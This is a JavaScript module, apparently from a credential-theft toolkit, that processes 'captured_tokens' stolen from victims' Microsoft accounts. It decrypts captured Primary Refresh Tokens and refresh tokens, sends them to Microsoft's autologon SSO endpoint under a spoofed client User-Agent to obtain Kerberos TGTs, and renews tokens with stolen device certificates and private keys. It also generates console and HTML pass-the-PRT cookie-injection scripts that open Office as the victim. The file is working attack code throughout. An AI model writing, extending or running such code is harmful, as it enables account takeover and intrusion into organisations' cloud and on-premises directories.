'use strict';

const axios = require('axios');
const ms = require('./microsoftclient');
const { decrypt, encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');
const { buildClientAssertion, getPrtCookie } = require('./devicemanager');

function parsePrtClaims(prt) {
  if (!prt || typeof prt !== 'string') return null;
  // Strip PRT:<> wrapping if present
  let raw = prt;
  if (raw.startsWith('PRT:<')) {
    raw = raw.slice('PRT:<'.length);
    // AAD sometimes wraps in the token format 'PRT:<token>' and there may be more
  }
  if (raw.startsWith('1.')) {
    return null;
  }
  const parts = raw.split('.');
  if (parts.length !== 3) {
    // Not a plain JWT - return null so caller can decide
    return null;
  }
  try {
    const payloadB64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    // base64url may lack padding; add it back
    const padded = payloadB64 + '==='.slice(0, (4 - (payloadB64.length % 4)) % 4);
    const payload = JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
    return payload;
  } catch (e) {
    return null;
  }
}

function isValidPrtJwt(prt) {
  if (!prt || typeof prt !== 'string') return false;
  const claims = parsePrtClaims(prt);
  if (!claims) return false;
  return !!(claims.tid || claims.uid || claims.oid || claims.acrs || claims.session_key || claims.client_info); 
}

/**
 * @returns {{ok: boolean, reason?: string, claims?: object}}
 */
function validatePrtForKerberos(prt, tenant) {
  const claims = parsePrtClaims(prt);
  if (!claims) {
    return { ok: false, reason: 'PRT is not a parseable JWT (may be empty, expired, or in the wrapped v2 format)' };
  }

  // Tenant must match what we're asking for
  if (tenant && claims.tid && claims.tid !== tenant) {
    return { ok: false, reason: `PRT tenant (${claims.tid}) does not match requested tenant (${tenant})` };
  }

  // The critical SSO capability flag
  if (!Array.isArray(claims.acrs) || !claims.acrs.includes('pfdr')) {
    return {
      ok: false,
      reason: `PRT lacks acrs=pfdr claim; cloud Kerberos/SSO derivation not permitted. Present acrs: ${JSON.stringify(claims.acrs || [])}`
    };
  }

  // Sanity: PRT must not be expired
  const now = Math.floor(Date.now() / 1000);
  if (claims.exp && claims.exp < now) {
    return { ok: false, reason: `PRT expired ${now - claims.exp}s ago` };
  }

  return { ok: true, claims };
}

/**
 * Derive Kerberos TGTs from a captured PRT
 * 
 * @param {string} prt - Primary Refresh Token JWT
 * @param {string} refreshToken - OAuth2 refresh token
 * @param {string} tenant - Tenant ID (tid)
 * @param {string} clientId - Client ID used for authentication
 * @param {string} sessionKeyJwe - Encrypted session key (if available)
 * @param {object} options - Additional options
 * @returns {object} { tgt_cloud, tgt_ad, session_key, kerberos_top_level_names, tgt_cloud_sessionkey }
 */
async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKeyJwe, options = {}) {
  const results = {
    tgt_cloud: null,
    tgt_ad: null,
    session_key: null,
    kerberos_top_level_names: null,
    tgt_cloud_sessionkey: null,
    error: null
  };

  if (!prt) {
    results.error = 'No PRT provided for derivation';
    return results;
  }

  if (!tenant || tenant === 'common' || tenant === 'organizations') {
    results.error = 'Derivation requires a specific tenant ID (got: ' + tenant + ')';
    return results;
  }

  const prtCheck = validatePrtForKerberos(prt, tenant);
  if (!prtCheck.ok) {
    results.error = 'PRT not eligible for Kerberos derivation: ' + prtCheck.reason;
    return results;
  }

  try {
    // Step 1: Derive cloud TGT via autologon.microsoftazuread-sso.com
    const cloudResult = await deriveCloudTGT(prt, tenant, clientId);
    Object.assign(results, cloudResult);

    // Step 2: If we have cloud TGT and session key, derive AD TGT
    if (results.tgt_cloud && results.session_key) {
      const adResult = await deriveADTGT(prt, tenant, results.session_key);
      Object.assign(results, adResult);
    }

  } catch (err) {
    console.error('[Kerberos] TGT derivation failed:', err.message);
    results.error = err.message;
  }

  return results;
}

/**
 * @param {string} prt - Primary Refresh Token
 * @param {string} tenant - Tenant ID
 * @param {string} clientId - Client ID
 * @returns {object} { tgt_cloud, session_key, kerberos_top_level_names, tgt_cloud_sessionkey }
 */
async function deriveCloudTGT(prt, tenant, clientId) {
  const results = {
    tgt_cloud: null,
    session_key: null,
    kerberos_top_level_names: null,
    tgt_cloud_sessionkey: null
  };

  const authHeader = 'PRT:<' + prt;

  try {
    // Request1: Get the SSO nonce and encrypted SSO ticket
    const response1 = await ms.post(
      `https://autologon.microsoftazuread-sso.com/${tenant}/token?SAML=JWT`,
      '',
      {
        headers: {
          'Authorization': authHeader,
          'Content-Type': 'text/plain',
          'Accept': 'application/json',
          'User-Agent': 'Microsoft AAD Integrated Authentication Client/1.0'
        },
        timeout: 30000,
        validateStatus: () => true
      }
    );

    if (response1.status !== 200) {
      let detail;
      switch (response1.status) {
        case 401:
          detail = 'unauthorized (PRT signature/replay rejected)';
          break;
        case 403:
          detail = 'forbidden (tenant policy blocks SSO for this principal)';
          break;
        case 404:
          detail = 'not found (PRT has no SSO/Kerberos capability for this tenant, or tenant does not exist)';
          break;
        case 410:
          detail = 'gone (PRT revoked or expired server-side)';
          break;
        case 429:
          detail = 'rate limited';
          break;
        default:
          detail = `unexpected HTTP ${response1.status}`;
      }
      const body = response1.data;
      const bodyPreview = body == null ? '' : (typeof body === 'string' ? body : JSON.stringify(body)).substring(0, 200);
      throw new Error(`Cloud TGT request failed: ${detail} | body=${bodyPreview ? bodyPreview : '(empty)'}`);
    }

    const data = response1.data;

    // Parse the response - it contains the encrypted SSO ticket
    if (data && typeof data === 'string') {
      // Response is the encrypted SSO ticket (base64-encoded Kerberos token)
      results.tgt_cloud = data.trim();
    } else if (data && data.sso_ticket) {
      results.tgt_cloud = data.sso_ticket;
    } else if (data && data.encrypted_sso_ticket) {
      results.tgt_cloud = data.encrypted_sso_ticket;
    }

    // Try to extract session key from response headers or body
    if (response1.headers['x-ms-sessionkey']) {
      results.session_key = response1.headers['x-ms-sessionkey'];
    }

    // Extract kerberos top level names from response
    if (data && data.kerberos_top_level_names) {
      results.kerberos_top_level_names = Array.isArray(data.kerberos_top_level_names)
        ? data.kerberos_top_level_names.join(',')
        : data.kerberos_top_level_names;
    }

    // Extract tgt_cloud_sessionkey if present
    if (data && data.tgt_cloud_sessionkey) {
      results.tgt_cloud_sessionkey = data.tgt_cloud_sessionkey;
    }

    if (!results.tgt_cloud) {
      throw new Error('No TGT cloud received from autologon endpoint');
    }

  } catch (err) {
    console.error('[Kerberos] Cloud TGT derivation failed:', err.message);
    throw err;
  }

  return results;
}

/**
 * @param {string} prt - Primary Refresh Token
 * @param {string} tenant - Tenant ID
 * @param {string} sessionKey - Decrypted session key
 * @returns {object} { tgt_ad, session_key }
 */
async function deriveADTGT(prt, tenant, sessionKey) {
  const results = {
    tgt_ad: null,
    session_key: null
  };

  try {
    // Step 1: Get the Azure AD Kerberos ticket (same as cloud TGT but for AD)
    const authHeader = 'PRT:<' + prt;

    const response = await ms.post(
      `https://autologon.microsoftazuread-sso.com/${tenant}/token`,
      '',
      {
        headers: {
          'Authorization': authHeader,
          'Content-Type': 'text/plain',
          'Accept': 'application/json',
          'User-Agent': 'Microsoft AAD Integrated Authentication Client/1.0'
        },
        timeout: 30000,
        validateStatus: () => true
      }
    );

    if (response.status === 200 && response.data) {
      const data = response.data;
      // AD TGT is typically in the response body
      if (typeof data === 'string') {
        results.tgt_ad = data.trim();
      } else if (data && data.sso_ticket) {
        results.tgt_ad = data.sso_ticket;
      } else if (data && data.kerberos_ticket) {
        results.tgt_ad = data.kerberos_ticket;
      }

      results.session_key = sessionKey;
    } else {
      // Some tenants may not return AD TGT - this is normal for cloud-only tenants
      console.warn('[Kerberos] AD TGT not returned (cloud-only tenant or no on-prem integration)');
      results.session_key = sessionKey;
      results.tgt_ad = null;
    }

  } catch (err) {
    console.warn('[Kerberos] AD TGT derivation skipped (cloud-only tenant):', err.message);
    results.session_key = sessionKey;
    results.tgt_ad = null;
  }

  return results;
}

/**
 * @param {number} limit - Maximum number of tokens to process
 * @returns {object} { processed, success, failed, skipped }
 */
async function bulkDeriveTGTs(limit = 50) {
  const stats = {
    processed: 0,
    success: 0,
    failed: 0,
    skipped: 0
  };

  try {
    // Find tokens with PRT but missing TGT cloud
    const [tokens] = await db.query(
      `SELECT id, email, prt, refresh_token_encrypted, session_key_jwe, tenant, client_id, account_type
       FROM captured_tokens
       WHERE prt IS NOT NULL AND prt != ''
         AND (tgt_cloud IS NULL OR tgt_cloud = '')
         AND deleted = 0
       ORDER BY created_at DESC
       LIMIT ?`,
      [limit]
    );

    if (!tokens || tokens.length === 0) {
      return stats;
    }

    for (const token of tokens) {
      stats.processed++;

      try {
        // Decrypt stored values
        const prt = decrypt(token.prt);
        const refreshToken = decrypt(token.refresh_token_encrypted);
        const sessionKeyJwe = decrypt(token.session_key_jwe);
        const tenant = token.tenant || config.AZURE_TENANT || 'common';
        const clientId = token.client_id || config.AZURE_CLIENT_ID;

        // Skip if no PRT or invalid tenant; only a real JWT-shaped PRT is eligible
        if (!prt || !token.prt || !isValidPrtJwt(prt) || tenant === 'common' || tenant === 'organizations') {
          stats.skipped++;
          continue;
        }

        // Derive TGTs
        const derivationResult = await deriveKerberosTGTs(
          prt,
          refreshToken,
          tenant,
          clientId,
          sessionKeyJwe
        );

        // Update database with derived TGTs
        const updateFields = [];
        const updateParams = [];

        if (derivationResult.tgt_cloud) {
          updateFields.push('tgt_cloud = ?');
          updateParams.push(encrypt(derivationResult.tgt_cloud));
        }

        if (derivationResult.tgt_ad) {
          updateFields.push('tgt_ad = ?');
          updateParams.push(encrypt(derivationResult.tgt_ad));
        }

        if (derivationResult.session_key) {
          updateFields.push('session_key_jwe = ?');
          updateParams.push(encrypt(derivationResult.session_key));
        }

        if (derivationResult.kerberos_top_level_names) {
          updateFields.push('kerberos_top_level_names = ?');
          updateParams.push(derivationResult.kerberos_top_level_names);
        }

        if (derivationResult.tgt_cloud_sessionkey) {
          updateFields.push('tgt_cloud_sessionkey = ?');
          updateParams.push(encrypt(derivationResult.tgt_cloud_sessionkey));
        }

        if (updateFields.length > 0) {
          updateFields.push('last_renewed = NOW()');
          updateParams.push(token.id);

          await db.query(
            `UPDATE captured_tokens SET ${updateFields.join(', ')} WHERE id = ?`,
            updateParams
          );

          stats.success++;
        } else {
          stats.skipped++;
        }

      } catch (tokenErr) {
        stats.failed++;
        console.error('[Kerberos] Failed to derive TGT for token', token.id, ':', tokenErr.message);
      }
    }

  } catch (err) {
    console.error('[Kerberos] Bulk derivation failed:', err.message);
  }

  return stats;
}

/**
 * Derive TGTs for a specific token
 * 
 * @param {string|number} tokenId - Token ID or capture ID
 * @returns {object} Derivation result with updated database fields
 */
async function deriveTGTForToken(tokenId) {
  try {
    const [tokens] = await db.query(
      `SELECT id, email, prt, refresh_token_encrypted, session_key_jwe, tenant, client_id, account_type, device_tenant_id
       FROM captured_tokens
       WHERE id = ? AND deleted = 0`,
      [tokenId]
    );

    if (!tokens || tokens.length === 0) {
      return { success: false, error: 'Token not found' };
    }

    const token = tokens[0];
    const prt = decrypt(token.prt);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const sessionKeyJwe = decrypt(token.session_key_jwe);
    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    const clientId = token.client_id || config.AZURE_CLIENT_ID;

    // Device-certificate renewal path for Broker-enrolled captures
    let renewedPrt = null;
    if (token.device_enrolled && token.encrypted_private_key && token.device_certificate_encrypted) {
      try {
        const deviceCertificate = decrypt(token.device_certificate_encrypted);
        const privateKeyPem = decrypt(token.encrypted_private_key);
        const clientAssertion = buildClientAssertion(
          privateKeyPem,
          token.device_id,
          `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
          deviceCertificate,
          null,
          null
        );
        const refreshOrPrt = refreshToken || prt;
        if (refreshOrPrt) {
          renewedPrt = await getPrtCookie(clientAssertion, refreshOrPrt, tenant);
        }
      } catch (renewErr) {
        console.error('[Kerberos] Device certificate renewal failed:', renewErr.message);
      }
    }

    const effectivePrt = renewedPrt || prt;
    if (!effectivePrt) {
      return { success: false, error: 'No PRT found for this token' };
    }

    if (!isValidPrtJwt(effectivePrt)) {
      return { success: false, error: 'No valid JWT-shaped PRT available for Kerberos derivation; raw refresh tokens are not accepted as PRT material' };
    }

    if (tenant === 'common' || tenant === 'organizations') {
      return { success: false, error: 'Cannot derive TGTs without specific tenant ID (got: ' + tenant + ')' };
    }

    const prtClaims = parsePrtClaims(effectivePrt);

    // Derive TGTs
    const derivationResult = await deriveKerberosTGTs(
      effectivePrt,
      refreshToken,
      tenant,
      clientId,
      sessionKeyJwe
    );

    // Check if derivation actually succeeded
    if (derivationResult.error) {
      return {
        success: false,
        error: derivationResult.error,
        token_id: token.id,
        email: token.email
      };
    }

    // Update database
    const updateFields = [];
    const updateParams = [];

    if (derivationResult.tgt_cloud) {
      updateFields.push('tgt_cloud = ?');
      updateParams.push(encrypt(derivationResult.tgt_cloud));
    }

    if (derivationResult.tgt_ad) {
      updateFields.push('tgt_ad = ?');
      updateParams.push(encrypt(derivationResult.tgt_ad));
    }

    if (derivationResult.session_key) {
      updateFields.push('session_key_jwe = ?');
      updateParams.push(encrypt(derivationResult.session_key));
    }

    if (derivationResult.kerberos_top_level_names) {
      updateFields.push('kerberos_top_level_names = ?');
      updateParams.push(derivationResult.kerberos_top_level_names);
    }

    if (derivationResult.tgt_cloud_sessionkey) {
      updateFields.push('tgt_cloud_sessionkey = ?');
      updateParams.push(encrypt(derivationResult.tgt_cloud_sessionkey));
    }

    if (updateFields.length > 0) {
      updateFields.push('last_renewed = NOW()');
      updateParams.push(token.id);

      await db.query(
        `UPDATE captured_tokens SET ${updateFields.join(', ')} WHERE id = ?`,
        updateParams
      );
    }

    return {
      success: true,
      token_id: token.id,
      email: token.email,
      tgt_cloud: derivationResult.tgt_cloud ? '(derived)' : null,
      tgt_ad: derivationResult.tgt_ad ? '(derived)' : null,
      session_key: derivationResult.session_key ? '(derived)' : null,
      kerberos_top_level_names: derivationResult.kerberos_top_level_names,
      tgt_cloud_sessionkey: derivationResult.tgt_cloud_sessionkey ? '(derived)' : null
    };

  } catch (err) {
    return { success: false, error: err.message };
  }
}

/**
 * @param {string} tokenId - Token ID to get credentials for
 * @returns {object} Complete credential blob for injection
 */
async function getFullPRTCredentialBlob(tokenId) {
  try {
    const [tokens] = await db.query(
      `SELECT id, email, prt, session_key_jwe, tgt_cloud 
             , tgt_ad, kerberos_top_level_names, tgt_cloud_sessionkey, 
              refresh_token_encrypted, account_type, tenant
       FROM captured_tokens
       WHERE id = ? AND deleted = 0`,
      [tokenId]
    );

    if (!tokens || tokens.length === 0) {
      return { success: false, error: 'Token not found' };
    }

    const token = tokens[0];
    const blob = {
      token_id: token.id,
      email: token.email,
      account_type: token.account_type,
      tenant: token.tenant,
      prt: decrypt(token.prt),
      session_key_jwe: decrypt(token.session_key_jwe),
      tgt_cloud: decrypt(token.tgt_cloud),
      tgt_ad: decrypt(token.tgt_ad),
      kerberos_top_level_names: token.kerberos_top_level_names,
      tgt_cloud_sessionkey: decrypt(token.tgt_cloud_sessionkey)
    };

    // Generate injection scripts
    blob.injector_scripts = generateInjectionScripts(blob);

    return { success: true, blob: blob };

  } catch (err) {
    return { success: false, error: err.message };
  }
}

/**
 * @param {object} blob - Credential blob
 * @returns {object} Various injection script formats
 */
function generateInjectionScripts(blob) {
  const scripts = {
    console: '',
    html: '',
    python: ''
  };

  if (!blob.prt) return scripts;

  const consoleScript = [
    '// Vgenius PRT-only injection',
    'document.cookie = "x-ms-RefreshTokenCredential=' + encodeURIComponent(blob.prt) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None";',
    'console.log("[Vgenius] PRT cookie set");',
    'setTimeout(function() { window.location.href = "https://www.office.com/"; }, 2000);'
  ].join('\n');

  scripts.console = consoleScript;
  scripts.html = '<script>' + consoleScript + '</script>';
  scripts.python = 'document.cookie = "x-ms-RefreshTokenCredential=' + encodeURIComponent(blob.prt) + '; domain=.login.microsoftonline.com; path=/; Secure; SameSite=None"';

  return scripts;
}

module.exports = {
  deriveKerberosTGTs,
  deriveCloudTGT,
  deriveADTGT,
  bulkDeriveTGTs,
  deriveTGTForToken,
  getFullPRTCredentialBlob,
  generateInjectionScripts,
  parsePrtClaims,
  isValidPrtJwt,
  validatePrtForKerberos
};
